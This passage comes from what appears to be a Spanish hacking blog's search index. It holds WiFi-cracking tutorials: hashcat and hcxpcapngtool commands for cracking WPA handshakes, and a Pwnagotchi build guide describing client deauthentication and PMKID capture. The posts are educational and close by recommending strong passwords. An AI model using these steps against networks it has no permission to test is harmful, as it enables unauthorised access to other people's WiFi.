capturas al formato que hashcat necesita para crackear la contraseña. con el siguiente comando se pued convertir el fichero .cap al formato hc22000 que necesita hashcat para atacar la clave.\nhcxpcapngtool -o hash.hc22000 fichero.cap dónde -o hash.hc2000 es el fichero de salida.\nhcxtools\nhashcat\n*puedes usar el conversor online de la pagina de hashcat.\nfinalmente, atacamos la contraseña con hashcat tal y como hicimos en la guía del pwnagotchi:\nataque de diccionario\nhashcat -m 22000 fichero_hash /usr/share/wordlists/rockyou.txt -o outfile.txt metodo fuerza bruta\nhashcat -a 3 -w 3 -m 22000 fichero_hash ?a?a?a?a?a?a?a?a --increment --increment-min=8 --increment-max=14 -o outfile.txt -a 3 indica ataque de diccionario. -w 3 para indicar carga de trabajo alta. \u0026ndash;increment es para hacer un ataque incremental, añadiremos también una longitud mínima y una máxima (wpa tiene a partir de 8 caracteres). hay que tener en cuenta que un ataque de fuerza bruta puede tardar horas, dias o semana (en el mejor de los casos), segun lo compleja que sea la contraseña. por ello, lo mejor es hacer un ataque de diccionario. cuanto más grande sea el diccionario, más probabilidades de romper la contraseña tendremos.\npara ello, hay muchos listados que nos pueden ser útiles. a continuación dejo varios recursos para descargar diccionarios.\ngithub seclists crackstation wordlist wakpass big lists weakpass all-in-ne lists en mi caso, hice un ataque de fuerza bruta usando la máscara abcd?d?d?d?d para acortar el tiempod de procesamiento, ya que la contraseña empieza por abcd y despues he usado los comodines ?d para indicar las posiciones donde a un caracter numérico.\ntras finalizar el ataque, el resultado obtenido ha sido abcd1234, una contraseña muy fácil de crackear. este ejemplo sirve para comprobar que las contraseñas sencillas que todo el mundo ha usado en algún momento que otro, son faciles de desencriptar con las herramientas y el tiempo necesario. el uso de contraseñas tipo madrid_2022, p@ssw0rd!2815 y combinaciones similres son inseguras, ya que pueden romperse con ataques combinados de diccionario y mascaras o reglas de permutación. así que recordad:\nusad contraseñas complejas que mezclen simbolos, letras y números para estar más protegidos!\n(◕‿‿◕) hack the planet! disclaimer: toda la información proporcionada en este tutorial es solo para fines educativos. no me hago responsable del mal uso de la información aquí mostrada.\neste tutorial está relacionado con la seguridad informática y no promueve la piratería informática/craqueo/piratería de software.\neste tutorial contiene información relacionada con contraseñas wpa y muestra cómo podrían desencriptarse. solo facilita información sobre las formas legales de recuperar las contraseñas.\n","title":"Aircrack-ng: hacking de redes WiFi"},{"date":"2022-09-13","image":"/images/post_pics/tutorial-pwnagotchi/Imagen0.jpg","link":"https://k3ssdev.github.io/posts/tutorial_pwnagotchi/","summary":"¿Qué es un Pwnagotchi? \u0026gt; En términos generales, Pwnagotchi es una mascota virtual para hackers y entusiastas de la ciberseguridad. Pero a diferencia de otras mascotas, ésta se alimenta capturando \u0026ldquo;handshakes\u0026rdquo; de las comunicaciones wifi y cuenta con una IA basada en el modelo A2C, lo que significa que utiliza el aprendizaje por refuerzo a través de métodos de prueba y error en comportamientos específicos que maximicen su recompensa en un entorno dinámico.","tags":["hacking","hashcat","linux","pet","raspberry","tutorial","wifi"],"text":"¿qué es un pwnagotchi? \u0026gt; en términos generales, pwnagotchi es una mascota virtual para hackers y entusiastas de la ciberseguridad. pero a diferencia de otras mascotas, ésta se alimenta capturando \u0026ldquo;handshakes\u0026rdquo; de las comunicaciones wifi y cuenta con una ia basada en el modelo a2c, lo que significa que utiliza el aprendizaje por refuerzo a través de métodos de prueba y error en comportamientos específicos que maximicen su recompensa en un entorno dinámico.\neste tutorial adapta la información de la página oficial de pwanagotchi. puedes encontrar más información en los siguientes enlaces:\nhttps://pwnagotchi.ai/\ngithub pwnagotchii\nhttps://pwnagotchi.ai/faq/\ndisclaimer: toda la información proporcionada en este tutorial es solo para fines educativos. no me hago responsable del mal uso de la información aquí mostrada.\neste tutorial está relacionado con la seguridad informática y no promueve la piratería informática/craqueo/piratería de software.\neste tutorial contiene información relacionada con contraseñas wpa y muestra cómo podrían desencriptarse. solo facilita información sobre las formas legales de recuperar las contraseñas. \u0026gt;\nalimentando al pwnagotchi 4-way handshake de wpa2 en las redes wifi, cuando un dispositivo se conecta al punto de acceso, es necesario que se lleve un proceso conocido como 4-way handshake para que se generen las claves de encriptación wpa. durante esta comunicación, ambos intercambias 4 paquetes y se generan las claves que se usaran durante la sesión para que el cliente pueda conectarse y ambos puedan intercambiar información de forma segura.\n*source: https://pwnagotchi.ai/intro/\nes durante este intercambio cuando nuestro pwnagotchi intercepta estas comunicaciones, ya que su tarjeta de red wifi está configurada en modo promiscuo para poder captarlas, aunque no vayan dirigidas a él. y aquí hace lo siguiente:\ndesautentica las estaciones cliente que detecta. un dispositivo desautenticado debe volver a autenticarse en su punto de acceso volviendo a realizar el protocolo de enlace de 4 vías con el ap, lo que le da a pwnagotchi otra oportunidad de olfatear los paquetes de protocolo de enlace y recopilar más material descifrable.\nenvía tramas de asociación directamente a los propios puntos de acceso para intentar forzarlos a filtrar el pmkid.\ncuando captura handshakes, el pwnagotchi se alimenta, afectando a su estado de ánimo y ayudándole a aprender gracias a su ia como obtener mejores recompensas. de esta forma, nuestra mascota va aprendiendo poco a poco a ser más eficiente, ¡e incluso puede aprender a trabajar en grupo cuando hay otros pwnagotchis cerca!\nconstruyendo el pwnagotchi necesitamos:\nraspberry pi zero w (también puede usarse un modelo 3 o modelo 4) tarjeta microsd (8gb mínimo recomendado, elegir una que sea rápida).\nun cable micro-usb de calidad que permita la transferencia de datos (¡no solo la carga!)\nuna fuente de alimentación. puedes usar un powerbank para móviles, o una batería ups lite v1.2 o pisugar para la raspberry pi. - ups lite v1.2\npantalla waveshare eink de 2,13” v2 (opcional) - waveshare e-ink display v2\ncarcasa: carcasa para waveshare v2 carcasa waveshare + ups\nno es necesario tener fuente de alimentación especifica, puedes conectarlo en casa a un cargador de móvil o al ordenador, y la pantalla tampoco es esencial ya que puede usarse en modo \u0026ldquo;headless\u0026rdquo;. a continuación, detallo la instalación básica sin estos dos elementos, ya que pueden añadirse posteriormente.\npasos de la instalación:\ndescargar la imagen disponible en github - se recomienda usar la 1.5.3 ya que la 1.5.5 no carga bien la ia (pero tiene solución si se usa la 1.5.5). descargamos esta v1.5.3\nflashea la imagen con balenaetcher, se puede descargar de la pagina de balena\nantes de arrancar el pwnagotchi, hay que meter un fichero llamado config.toml en la partición boot de la tarjeta microsd. a continuación, pongo lo que he usado para que funcione sin pantalla y para que se conecte a al teléfono por bt para poder verlo y gestionarlo. el whitelist deberían ser las redes que no quieras que guarde los handshakes, cambiad los valores\nestos son los valores del fichero, por favor cambia los valores de whitelist, grid.exclude y android.mac. si se usa un display waveshare, cambiar el valor de ui.display.type\nmain.name = \u0026#34;nombre_del_pwnagotchi\u0026#34; main.lang = \u0026#34;es\u0026#34; main.whitelist = [ \u0026#34;tu_red_wifi\u0026#34;, \u0026#34;otra_red_wifi, \u0026#34;fo:od:ba:be:fo:od\u0026#34;, \u0026#34;fo:od:ba\u0026#34;, ] main.plugins.grid.enabled = true main.plugins.grid.report = true main.plugins.grid.exclude = [ \u0026#34;tu_red_wifi\u0026#34;,] ui.display.enabled = true ui.display.type = \u0026#34;inky\u0026#34; ui.display.color = \u0026#34;black\u0026#34; ui.display.rotation = 180 main.plugins.bt-tether.enabled = true main.plugins.bt-tether.devices.android-phone.enabled = true main.plugins.bt-tether.devices.android-phone.search_order = 1 main.plugins.bt-tether.devices.android-phone.mac = \u0026#34;direccion_mac_telefono\u0026#34; main.plugins.bt-tether.devices.android-phone.ip = \u0026#34;192.168.44.44\u0026#34; main.plugins.bt-tether.devices.android-phone.netmask = 24 main.plugins.bt-tether.devices.android-phone.interval = 1 main.plugins.bt-tether.devices.android-phone.scantime = 10 main.plugins.bt-tether.devices.android-phone.max_tries = 10 main.plugins.bt-tether.devices.android-phone.share_internet = true main.plugins.bt-tether.devices.android-phone.priority = 1 main.plugins.bt-tether.devices.ios-phone.enabled = true main.plugins.bt-tether.devices.ios-phone.search_order = 2 main.plugins.bt-tether.devices.ios-phone.mac = \u0026#34;direccion_mac_iphone\u0026#34; main.plugins.bt-tether.devices.ios-phone.ip = \u0026#34;172.20.10.6\u0026#34; main.plugins.bt-tether.devices.ios-phone.netmask = 24 main.plugins.bt-tether.devices.ios-phone.interval = 5 main.plugins.bt-tether.devices.ios-phone.scantime = 20 main.plugins.bt-tether.devices.ios-phone.max_tries = 0 main.plugins.bt-tether.devices.ios-phone.share_internet = true main.plugins.bt-tether.devices.ios-phone.priority = 999 main.plugins.memtemp.enabled = true main.plugins.memtemp.scale = \u0026#34;celsius\u0026#34; main.plugins.memtemp.orientation = \u0026#34;horizontal\u0026#34; coloca la tarjeta y enciende el pwnagotchi. dejarle un rato para que arranque y cargue la ia (esto es muy importante, mínimo 10 minutos). si hemos configurado la mac del teléfono en el fichero config.toml, se nos conectara por bt al teléfono cuando haya arrancado. nos debería llegar una solicitud de emparejamiento. antes de aceptarla, seleccionar en el teléfono \u0026ldquo;compartir conexión por bluetooth\u0026rdquo; para que le pueda dar conexión a internet cuando se conecte. una vez se emparejan, podemos acceder a la dirección ip 192.168.44.44:8080 en android y 172.20.10.6:8080 si es un iphone/ipad.\ndisfrutamos de nuestro pwnagotchi ^__^\nconfiguración y uso ahora nos podemos conectar a nuestro pwnagotchi por bt, por lo que podemos además de verle a través del navegador, podemos acceder a él a través de ssh. podemos usar termux en android para conectarnos directamente desde el teléfono. si queremos conectarnos desde nuestro ordenador, lo conectaremos por usb (dejando conectado también el cable de corriente). al conectarlo deberemos configurar una conexión con el dispositivo rndis detectado. en windows puede dar problemas, hay que buscar el controlador de rndis para windows y actualizarlo desde el administrador de dispositivos. en linux, lo detectará sin problema. añadimos la conexión con el dispositivo rndis y la configuramos con los siguientes parámetros: ipv4: 10.0.0.1 netmask: 255.255.255.0 dns: 8.8.8.8 el resto de los valores no hacen falta. una vez hecho, podemos conectarnos por ssh desde el equipo a la dirección 10.0.0.2 pi@10.0.0.2 contraseña: raspberry ahora cambiamos la contraseña del usuario por seguridad con el comando passwd.\nactualizamos el pwnagotchi. ¡apt update y apt upgrade no funcionan bien debido a un problema con la firma del source del kernel re4son!\nversión 1.5.3 -\u0026gt; vamos a actualizar a la versión 1.5.5 con estos comandos sudo pwnagotchi plugins update sudo pwnagotchi plugins upgrade versión 1.5.5 -\u0026gt; el anterior paso no es necesario, pero se puede hacer. para arreglar el problema que tiene con la ia que no carga, ejecutamos el siguiente comando que lo arreglará: sudo pip3 install --upgrade numpy este proceso puede tardar mucho tiempo, se recomienda hacerlo desde el ordenador y no usando termux.\nañadimos alias pwnlog y pwnver en el fichero .bashrc alias pwnlog=\u0026#39;tail -f -n300 /var/log/pwn*.log | sed --unbuffered \u0026#34;s/,[[:digit:]]\\{3\\}\\]//g\u0026#34; | cut -d \u0026#34; \u0026#34; -f 2-\u0026#39; alias pwnver=\u0026#39;python3 -c \u0026#34;import pwnagotchi as p; print(p.__version__)\u0026#34;\u0026#39; accedemos a la web ui del pwnagotchi y pinchamos en plugins. aquí podemos activar los plugins, en este caso activamos logtail y webcfg. una vez activados y recargada la página, si pinchamos en los nombres podemos ver un log en el caso de logtail y en wbcfg accederemos a la configuración del fichero configuration.toml que hay corriendo en el sistema, donde podremos hacer cambios. a partir de aquí, podemos seguir usando nuestro pwnagotchi. los siguientes pasos serían insstalar nuevos plugins desde la línea de comandos y configurar la copia de seguridad de nuestro nuevo coleguita por si fuese necesario restaurarlo en el futuro.\narreglando apt update y apt upgrade si intentas actualizar las fuentes y los paquetes, encontrarás que da un error que no permite hacerlo. a continuación, muestro la solución que he encontrado:\nsudo nano /etc/apt/preferences.d/kali.pref (contenido más abajo) wget -o - https://re4son-kernel.com/keys/http/archive-key.asc | sudo apt-key add - sudo apt update –allow-releaseinfo-change-suite -y sudo apt full-upgrade -y contenido fichero /etc/apt/preferences.d/kali.pref\npackage: * pin: release n=kali-pi pin-priority: 999 este proceso puede tardar y nuestro pwnagotchi podria desconectarse del telefóno o del pc, así que recomiendo ejecutar todo esto en una sesión de screen o tmux\nhaciendo amigos nuestro pwnagotchi nos permite enviar mensajes cifrados mediante pwnmail, solo necesitamos el fingerprit del perfil de otra persona. a continuación, os dejo el mío por si queréis añadirme.\npwnamon las caras de nuestro pwnagotchi a continuación, se explican las caras del pwnagotchi. este fragmento está sacado directamente de la web oficial.\nhttps://pwnagotchi.ai/intro/\nel siguiente listado es el conjunto predeterminado de rostros que se pueden personalizar cambiándolo en la sección ui.faces dentro del fichero /etc/pwnagotchi/config.toml\n(⇀‿‿↼) durmiendo este es el estado desde el que comenzará la unidad. además, de vez en cuando tu pwnagotchi también realizará siestas de unos segundos mientras salta entre los canales wifi.\n(≖‿‿≖) despertar la unidad está en los últimos segundos de su siesta.\n(◕‿‿◕) despierto / normal esta cara es el estado neutral despierto de la unidad. se utilizará para suavizar la transición entre otros estados de ánimo y en general cuando no exista una causa externa de estados de ánimo positivos o negativos. también se puede usar, al azar, cuando se encuentra otra unidad por primera vez (cada unidad mantiene un registro de todas las unidades que encontró).\n(⚆_⚆), (☉_☉) observando (estado de ánimo neutral) tu pwnagotchi está esperando y observando lo que bettercap puede encontrar en todos los canales en los que salta.\n( ◕‿◕), (◕‿◕ ) observando (feliz) cuando hay una o varias unidades cerca y su contador de bonos acumulativo es mayor o igual que elpersonality.bond_encounters_factor, esta será la cara de la unidad durante la observación.\n(°▃▃°) intenso la unidad está enviando una trama de asociación a un punto de acceso para obligarlo a filtrar el pmkid.\n(⌐■_■) guay la unidad está desautenticando una estación cliente desde un punto de acceso. esta cara también se puede elegir al azar cuando se encuentra con otra unidad por primera vez.\n(•‿‿•) feliz tu pwnagotchi es feliz en uno de los siguientes casos:\nla ia acaba de terminar de cargarse y está lista. se acaba de capturar material clave válido para un punto de acceso. en modo manu, si la última sesión fue corta o si se ha capturado algún apretón de manos durante la misma. cuando se cumple otra unidad y el nivel de bonos es lo suficientemente alto. (^‿‿^) agradecido tu pwnagotchi está agradecido en uno de los siguientes casos:\nel nivel de bonos acumulativo de las unidades cercanas es al menos cinco veces elpersonality.bond_encounters_factor. la unidad debería estar aburrida, pero hay suficientes unidades amigas cerca. la unidad debería estar triste, pero hay suficientes unidades amigas cerca. la unidad debería estar sola, pero hay suficientes unidades amigas cerca. (ᵔ◡◡ᵔ) emocionado tu pwnagotchi está excitado por uno de los siguientes casos:\nel número de épocas con alguna actividad es mayor o igual quepersonality.excited_num_epochs. aleatoriamente si se cumple una unidad con un alto nivel de bonos. si no has leído mensajes pwnmail en esa unidad. (✜‿‿✜) inteligente aleatoriamente si se cumple una unidad con un nivel de bonos medio-alto.\n(♥‿‿♥) amistoso aleatoriamente si se cumple una unidad con un alto nivel de bonos.\n(☼‿‿☼) motivado tu pwnagotchi acaba de obtener la mejor puntuación-nivel de recompensa en su existencia o acaba de conocer una unidad con un vínculo alto.\n(≖__≖) desmotivado tu pwnagotchi acaba de anotar lo peor nivel de recompensa en su existencia.\n(-__-) aburrido si no hay unidades amigas alrededor y se alcanza la cantidad de épocas inactivas consecutivas personality.bored_num_epochs.\n(╥☁╥) triste si no hay unidades amigas alrededor y se alcanza la cantidad de épocas inactivas consecutivas personality.sad_num_epochs. (ب__ب) solitario si su pwnagotchi acaba de perder el contacto con una unidad amiga que estaba cerca, o si la cantidad de interacciones perdidas con puntos de acceso o estaciones de clientes (la cantidad de veces que intentó enviar algún tipo de paquete, pero falló el objetivo porque no está en rango ya) es mayor o igual que personality.max_misses_for_recon. y no hay unidades amigas alrededor.\n(☓‿‿☓) roto su unidad se está reiniciando como una estrategia para solucionar un bug de ceguera temporal después de instalar una actualización.\n(#__#) depuración se utiliza para depurar y probar mensajes en pantalla.\nficheros de handshakes los handshakes capturados se guardan en ficheros con extensión “.pcap” dentro del pwnagotchi. estos se pueden descifrar más tarde mediante hardware y software adecuados, como por ejemplo hashcat tras convertirlo al formato adecuado con hcxpcapngtool (hcxtools).\nhcxtools\nhashcat\nlos siguientes ejemplos se han realizado usando un equipo de sobremesa con kali linux.\nconvertir fichero pcap a hc22000 con hcxpcapngtool hcxpcapngtool -o hash.hc22000 -e essidlist fichero.pcap donde \u0026ldquo;hash.hc22000\u0026rdquo; es el nombre del fichero donde guardara el hash, y \u0026ldquo;essidlist\u0026rdquo; el fichero donde guardara el nombre del ssid.\nsi no tienes a mano esta herramienta, puedes usar este conversor online\ndescifrar el hash obtenido con hashcat metodo best64 + wordlist\nhashcat -m 22000 fichero_hash -r /usr/share/hashcat/rules/best64.rule /usr/share/wordlists/rockyou.txt -o outfile.txt metodo fuerza bruta\nhashcat -a 3 -m 22000 fichero_hash ?a?a?a?a?a?a?a?a -o outfile.txt para ver a que corresponden las opciones usadas, ejecutar hashcat -h y al final salen los cuadros con estas opciones explicadas.\nhasta aquí llega el tutorial. seguramente se podría seguir indagando más en el tema del pwngrid, el pwnmail y los peers, pero se haría excesivamente largo. os animo a que sigáis investigando y aprendiendo, y sobre todo que os llevéis siempre encima a vuestro pwnagotchi. ¡nos vemos!\n(◕‿‿◕) hack the planet! ","title":"Tutorial Pwnagotchi"},{"date":"2022-09-12","image":"","link":"https://k3ssdev.github.io/posts/hello-world/","summary":"Empiezo otro blog \u0026gt; Hola gente. Al final me he puesto y me he creado un pequeño blog estático.\nHe usado Hugo para hacerlo y GitHub Pages para el hospedaje. Aunque sinceramente no espero actualizarlo mucho, creo que puede ser útil para guardarme las notas sobre linux, ethical hacking y/o tutoriales que me vaya haciendo.","tags":[],"text":"empiezo otro blog \u0026gt; hola gente. al final me he puesto y me he creado un pequeño blog estático.\nhe usado hugo para hacerlo y github pages para el hospedaje. aunque sinceramente no espero actualizarlo mucho, creo que puede ser útil para guardarme las notas sobre linux, ethical hacking y/o tutoriales que me vaya haciendo. básicamente será un cuaderno de notas sobre sistemas y seguridad\u0026hellip;\n¡nos vemos!\n(◕‿‿◕) ~ hack the planet!\n","title":"Hello, world"},{"date":"0001-01-01","image":"","link":"https://k3ssdev.github.io/pages/about/","summary":"¡Hola mundo!\nMi nombre es Alberto Pérez, pero en redes me gusta usar el nick de k3ssdev. Soy Administrador de Sistemas en Red y certificado en Linux por Linux Professional Institute.\nActualmente compagino mi trabajo como técnico de sistemas con Linux y bases de datos con los estudios de CFGS de Desarrollo de Aplicaciones Multiplataforma.","tags":[],"text":"¡hola mundo!\nmi nombre es alberto pérez, pero en redes me gusta usar el nick de k3ssdev. soy administrador de sistemas en red y certificado en linux por linux professional institute.\nactualmente compagino mi trabajo como técnico de sistemas con linux y bases de datos con los estudios de cfgs de desarrollo de aplicaciones multiplataforma. soy entusiasta de la ciberseguridad, dedico también parte de mi tiempo formarme sobre ethical hacking y pentesting, además de resolver retos ctf en plataformas como tryhackme.\nmis perfiles linkdin e-mail github tryhackme ¡nos vemos!\n(◕‿‿◕) hack the planet! ","title":"About"}]
}

